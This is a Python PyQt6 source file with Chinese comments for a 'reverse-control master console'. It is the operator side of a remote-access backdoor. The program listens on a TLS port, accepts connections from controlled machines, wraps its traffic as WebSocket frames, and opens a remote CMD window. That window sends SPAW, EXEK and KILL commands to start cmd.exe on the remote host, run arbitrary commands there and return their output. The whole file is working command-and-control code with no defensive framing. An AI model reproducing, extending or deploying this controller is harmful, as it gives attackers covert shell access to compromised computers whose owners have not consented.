import sys
import socket
import threading
import ssl
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                             QMenu, QAbstractItemView)
from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
import struct

WS_OP_CONTINUE = 0x00
WS_OP_TEXT = 0x01
WS_OP_BINARY = 0x02
WS_OP_CLOSE = 0x08
WS_OP_PING = 0x09
WS_OP_PONG = 0x0A


def ws_unmask_payload(payload: bytes, mask_key: bytes) -> bytes:
    """服务端：对客户端带mask的payload解掩码"""
    return bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))


def ws_build_server_frame(fin: bool, opcode: int, payload: bytes) -> bytes:
    """
    构建服务端WebSocket帧：**服务端禁止mask**
    """
    header = bytearray()
    # 第一个字节 fin + opcode
    b1 = (0x80 if fin else 0) | (opcode & 0x0f)
    header.append(b1)

    length = len(payload)
    b2 = 0  # 服务端 mask位=0

    if length <= 125:
        b2 |= length
        header.append(b2)
    elif length <= 0xFFFF:
        b2 |= 126
        header.append(b2)
        header.extend(struct.pack(">H", length))
    else:
        b2 |= 127
        header.append(b2)
        header.extend(struct.pack(">Q", length))

    # 服务端不加mask key，直接拼接payload
    return bytes(header) + payload


def ws_parse_frame(data: bytearray):
    """
    解析WebSocket帧（服务端，客户端发来带mask）
    返回：(fin, opcode, payload, consumed_bytes)
    数据不足返回 (None, None, None, 0)；协议错误返回None
    """
    if len(data) < 2:
        return (None, None, None, 0)
    p = 0
    b1 = data[p]
    p += 1
    b2 = data[p]
    p += 1

    fin = bool(b1 & 0x80)
    opcode = b1 & 0x0F
    has_mask = bool(b2 & 0x80)
    payload_len = b2 & 0x7F

    if payload_len == 126:
        if len(data) < p + 2:
            return (None, None, None, 0)
        payload_len = struct.unpack(">H", data[p:p+2])[0]
        p += 2
    elif payload_len == 127:
        if len(data) < p + 8:
            return (None, None, None, 0)
        payload_len = struct.unpack(">Q", data[p:p+8])[0]
        p += 8

    mask_key = b""
    if has_mask:
        if len(data) < p + 4:
            return (None, None, None, 0)
        mask_key = data[p:p+4]
        p += 4

    total_need = p + payload_len
    if len(data) < total_need:
        return (None, None, None, 0)

    raw_payload = data[p:p+payload_len]
    if has_mask:
        payload = ws_unmask_payload(raw_payload, mask_key)
    else:
        payload = raw_payload

    consumed = total_need
    return (fin, opcode, payload, consumed)


def ws_handle_http_upgrade(sock: ssl.SSLSocket) -> bool:
    """处理WebSocket HTTP GET /ws 101升级握手"""
    buf = bytearray()
    sock.settimeout(3.0)
    try:
        while True:
            chunk = sock.recv(1024)
            if not chunk:
                return False
            buf.extend(chunk)
            if b"\r\n\r\n" in buf:
                break
    except Exception:
        return False
    sock.settimeout(None)

    if b"Upgrade: websocket" not in buf or b"Sec-WebSocket-Key:" not in buf:
        return False

    # 简易应答101 Switching Protocols
    resp = (
        b"HTTP/1.1 101 Switching Protocols\r\n"
        b"Upgrade: websocket\r\n"
        b"Connection: Upgrade\r\n"
        b"Sec-WebSocket-Accept: dummy_accept\r\n"
        b"\r\n"
    )
    try:
        sock.sendall(resp)
    except Exception:
        return False
    return True


class ClientSignals(QObject):
    on_outp = pyqtSignal(object, str)
    on_disconnect = pyqtSignal(object)


class ClientSession:
    def __init__(self, ssl_conn: ssl.SSLSocket, addr):
        self.conn = ssl_conn
        self.addr = addr
        self.ip_str = f"{addr[0]}:{addr[1]}"
        self.last_pong = datetime.now()
        self.connected = True
        self._recv_buf = bytearray()
        self.signals = ClientSignals()
        self._send_lock = threading.Lock()
        # ws分片缓存
        self._frag_buf = bytearray()
        self._frag_opcode = 0

    def send_packet(self, body: bytes) -> bool:
        """
        上层调用和原来完全一样！
        body就是原来业务包(PING/SPAW/KILL/EXEK...)，内部包装成WebSocket BINARY帧
        """
        if not self.connected:
            return False
        try:
            ws_frame = ws_build_server_frame(True, WS_OP_BINARY, body)
            with self._send_lock:
                self.conn.sendall(ws_frame)
            return True
        except (OSError, BrokenPipeError, ssl.SSLError):
            self.close()
            return False

    def reset_fragment(self):
        self._frag_buf.clear()
        self._frag_opcode = 0

    def close(self):
        self.connected = False
        try:
            frame_close = ws_build_server_frame(True, WS_OP_CLOSE, b"")
            self.conn.sendall(frame_close)
        except Exception:
            pass
        try:
            self.conn.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        try:
            self.conn.close()
        except Exception:
            pass


class RemoteCmdDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.setWindowTitle(f"远程CMD - {client_session.ip_str}")
        self.resize(680, 450)
        self.client = client_session
        self.is_alive = True

        lay = QVBoxLayout(self)
        self.out_box = QTextEdit()
        self.out_box.setReadOnly(True)
        lay.addWidget(self.out_box)

        input_lay = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("输入命令回车执行")
        self.cmd_input.returnPressed.connect(self.on_enter_command)
        input_lay.addWidget(self.cmd_input)
        lay.addLayout(input_lay)

        self.out_box.append(f"==== 连接 {self.client.ip_str} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
        self.client.send_packet(b"SPAW")

    @pyqtSlot(str)
    def append_text(self, text: str):
        self.out_box.append(text)

    def on_enter_command(self):
        cmd = self.cmd_input.text().strip()
        self.cmd_input.clear()
        if not self.is_alive or not self.client.connected:
            self.out_box.append("\n[!] 连接断开")
            return
        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
        ok = self.client.send_packet(payload)
        self.out_box.append(f"> {cmd}")
        if not ok:
            self.out_box.append("[发送失败]")

    def closeEvent(self, event):
        self.is_alive = False
        if self.client.connected:
            self.client.send_packet(b"KILL")
        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
            del self.main_window.open_cmd_dialogs[self.client]
        super().closeEvent(event)


class ClientListModel(QAbstractListModel):
    def __init__(self):
        super().__init__()
        self.items: list[ClientSession] = []

    def rowCount(self, parent=QModelIndex()):
        return len(self.items)

    def data(self, index: QModelIndex, role=Qt.ItemDataRole.DisplayRole):
        if not index.isValid() or role != Qt.ItemDataRole.DisplayRole:
            return QVariant()
        s = self.items[index.row()]
        return QVariant(f"{s.ip_str} | last_pong:{s.last_pong.strftime('%H:%M:%S')}")

    def add(self, sess: ClientSession):
        self.beginInsertRows(QModelIndex(), len(self.items), len(self.items))
        self.items.append(sess)
        self.endInsertRows()

    def remove_by_obj(self, sess: ClientSession):
        idx = self.items.index(sess)
        self.beginRemoveRows(QModelIndex(), idx, idx)
        self.items.pop(idx)
        self.endRemoveRows()


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WSS WebSocket反向控制主控端")
        self.resize(700, 500)
        self.server_sock: socket.socket | None = None
        self.ssl_context = None
        self.server_running = False
        self.client_model = ClientListModel()
        self.open_cmd_dialogs: dict[ClientSession, RemoteCmdDialog] = {}

        w = QWidget()
        self.setCentralWidget(w)
        lay = QVBoxLayout(w)

        top_lay = QHBoxLayout()
        top_lay.addWidget(QLabel("WSS监听端口:"))
        self.port_edit = QLineEdit("4433")
        top_lay.addWidget(self.port_edit)
        self.btn_start = QPushButton("启动WSS监听")
        self.btn_start.clicked.connect(self.start_server)
        top_lay.addWidget(self.btn_start)
        self.btn_stop = QPushButton("停止监听")
        self.btn_stop.clicked.connect(self.stop_server)
        self.btn_stop.setEnabled(False)
        top_lay.addWidget(self.btn_stop)
        lay.addLayout(top_lay)

        self.view = QListView()
        self.view.setModel(self.client_model)
        self.view.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection)
        self.view.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.view.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.view)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        lay.addWidget(self.log_box)

        # 心跳定时器：10秒发一次PING
        self.ping_timer = QTimer(self)
        self.ping_timer.setInterval(10000)
        self.ping_timer.timeout.connect(self.broadcast_ping)

    def log(self, msg):
        self.log_box.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

    @pyqtSlot()
    def broadcast_ping(self):
        for sess in list(self.client_model.items):
            if sess.connected:
                sess.send_packet(b"PING")

    def accept_loop(self):
        while self.server_running:
            try:
                raw_conn, addr = self.server_sock.accept()
                try:
                    ssl_conn = self.ssl_context.wrap_socket(raw_conn, server_side=True)
                except ssl.SSLError as e:
                    self.log(f"TLS握手失败 {addr}: {e}")
                    raw_conn.close()
                    continue

                # 执行WebSocket HTTP Upgrade握手
                ok_handshake = ws_handle_http_upgrade(ssl_conn)
                if not ok_handshake:
                    self.log(f"WebSocket HTTP升级握手失败 {addr}")
                    ssl_conn.close()
                    continue

                sess = ClientSession(ssl_conn, addr)
                sess.signals.on_outp.connect(self.handle_session_outp)
                sess.signals.on_disconnect.connect(self.handle_session_disconnect)
                self.client_model.add(sess)
                self.log(f"[WSS新接入] {sess.ip_str}")
                t = threading.Thread(target=self.client_recv_loop, args=(sess,), daemon=True)
                t.start()
            except OSError:
                break

    @pyqtSlot(object, str)
    def handle_session_outp(self, sess: ClientSession, text: str):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs[sess]
            dlg.append_text(text)

    @pyqtSlot(object)
    def handle_session_disconnect(self, sess: ClientSession):
        if sess in self.open_cmd_dialogs:
            dlg = self.open_cmd_dialogs.pop(sess)
            dlg.append_text("\n[!] WSS连接已经断开")
        self.client_model.remove_by_obj(sess)
        self.log(f"[断开] {sess.ip_str}")

    def client_recv_loop(self, sess: ClientSession):
        buf = sess._recv_buf
        while sess.connected:
            try:
                chunk = sess.conn.recv(4096)
                if not chunk:
                    break
                buf.extend(chunk)

                while True:
                    ret = ws_parse_frame(buf)
                    fin, opcode, payload, consumed = ret
                    if consumed <= 0:
                        break
                    # 移除已经消费的数据
                    del buf[:consumed]

                    # 处理控制帧 PING/PONG/CLOSE
                    if opcode == WS_OP_PING:
                        pong_frame = ws_build_server_frame(True, WS_OP_PONG, payload)
                        with sess._send_lock:
                            sess.conn.sendall(pong_frame)
                        continue
                    elif opcode == WS_OP_PONG:
                        continue
                    elif opcode == WS_OP_CLOSE:
                        break
                    elif opcode in (WS_OP_BINARY, WS_OP_CONTINUE):
                        # 处理分片
                        if opcode == WS_OP_BINARY:
                            sess.reset_fragment()
                            sess._frag_opcode = opcode
                        sess._frag_buf.extend(payload)
                        if fin:
                            full_body = bytes(sess._frag_buf)
                            sess.reset_fragment()
                            # full_body == 原来裸TLS的body，业务逻辑完全复用！
                            if len(full_body) >= 4:
                                cmd_code = full_body[0:4]
                                if cmd_code == b"PONG":
                                    sess.last_pong = datetime.now()
                                    self.client_model.dataChanged.emit(QModelIndex(), QModelIndex())
                                elif cmd_code == b"OUTP":
                                    output_bytes = full_body[4:]
                                    out_text = output_bytes.decode("gbk", errors="replace")
                                    sess.signals.on_outp.emit(sess, out_text)

            except (OSError, ssl.SSLError):
                break
        sess.close()
        sess.signals.on_disconnect.emit(sess)

    def start_server(self):
        port = int(self.port_edit.text())
        self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.ssl_context.load_cert_chain(certfile="server.crt", keyfile="server.key")

        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind(("0.0.0.0", port))
        self.server_sock.listen(8)
        self.server_running = True
        threading.Thread(target=self.accept_loop, daemon=True).start()

        self.ping_timer.start()

        self.btn_start.setEnabled(False)
        self.btn_stop.setEnabled(True)
        self.log(f"WSS WebSocket服务端启动，监听端口 {port}")

    def stop_server(self):
        self.ping_timer.stop()

        self.server_running = False
        if self.server_sock:
            try:
                self.server_sock.close()
            except Exception:
                pass
        for s in self.client_model.items:
            s.close()
        self.open_cmd_dialogs.clear()
        self.btn_start.setEnabled(True)
        self.btn_stop.setEnabled(False)
        self.log("WSS监听已停止")

    def on_context_menu(self, pos):
        idx = self.view.indexAt(pos)
        if not idx.isValid():
            return
        sess: ClientSession = self.client_model.items[idx.row()]
        menu = QMenu()
        act_open_cmd = menu.addAction("打开远程CMD会话")
        ret = menu.exec(self.view.viewport().mapToGlobal(pos))
        if ret == act_open_cmd:
            if sess in self.open_cmd_dialogs:
                dlg = self.open_cmd_dialogs[sess]
                if dlg.isVisible():
                    dlg.raise_()
                    dlg.activateWindow()
                    return
                else:
                    del self.open_cmd_dialogs[sess]
            dlg = RemoteCmdDialog(sess, parent=self)
            self.open_cmd_dialogs[sess] = dlg
            dlg.show()

    def closeEvent(self, event):
        self.stop_server()
        event.accept()


if __name__ == "__main__":
    app = QApplication(sys.argv)
    win = MainWindow()
    win.show()
    sys.exit(app.exec())
